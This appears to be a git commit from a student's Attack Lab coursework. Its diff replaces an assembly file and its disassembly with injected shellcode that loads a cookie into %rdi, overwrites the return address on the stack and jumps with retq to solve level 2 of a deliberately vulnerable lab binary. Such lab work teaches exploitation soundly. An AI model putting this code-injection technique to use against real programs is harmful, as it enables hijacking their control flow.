67c5f63df9d5ea10ce6d6f48ec30dff1bfdf6c6b
zjh <zhoujianhui@shu.edu.cn>
2021-01-11 15:58:06 +0800

    Attack Lab: resolve level 2
    Level 2, inject instruction, use retq and %rsp.
    Now resolving level 3.
    
    Signed-off-by: zjh <zhoujianhui@shu.edu.cn>

--- 3-attack-lab/target1/example.d
+++ 3-attack-lab/target1/example.d
@@ -4,6 +4,8 @@ example.o：     文件格式 elf64-x86-64
 
 Disassembly of section .text:
 
-0000000000000000 <.text>:
-   0:	48 8b 3c 25 fa 97 b9 	mov    0x59b997fa,%rdi
-   7:	59 
+0000000000000000 <asm_call>:
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	48 c7 04 24 ec 17 40 	movq   $0x4017ec,(%rsp)
+   e:	00 
+   f:	c3                   	retq   
--- 3-attack-lab/target1/example.s
+++ 3-attack-lab/target1/example.s
@@ -1,1 +1,9 @@
-mov 0x59b997fa,%rdi
+.global asm_call
+.code64
+.section .text
+
+
+asm_call:
+    movq $0x0000000059b997fa,%rdi
+    movq $0x00000000004017ec,(%rsp)
+    retq
